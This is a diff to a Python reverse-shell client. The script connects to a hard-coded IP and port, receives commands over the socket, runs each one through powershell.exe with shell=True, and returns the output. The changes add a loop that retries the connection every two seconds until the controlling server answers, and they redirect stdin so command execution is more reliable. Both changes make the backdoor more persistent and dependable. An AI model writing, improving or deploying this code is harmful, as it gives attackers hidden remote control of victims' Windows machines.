@@ -9,7 +9,13 @@ identifier = "<END OF FILE>"
 arp_addresss = ("192.168.18.148",9000)
 # binding to serer ip
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(arp_addresss)
+while True:
+    try:
+        s.connect(arp_addresss)
+        break  # Exit the loop if connection is successful
+    except ConnectionRefusedError:
+        print("Connection refused. Retrying in 2 seconds...")
+        time.sleep(2)
 while True:
     command = s.recv(CHUNK_SIZE)
     command = command.decode()
@@ -69,7 +75,7 @@ while True:
 
     #for running a command on pwershell
     else:
-       raw_message =  subprocess.run(["powershell.exe",command],shell = True,capture_output=True)
+       raw_message =  subprocess.run(["powershell.exe",command],shell = True,capture_output=True,stdin=subprocess.DEVNULL)
        if raw_message.stderr == "".encode():
           message = raw_message.stdout.decode()
        else:
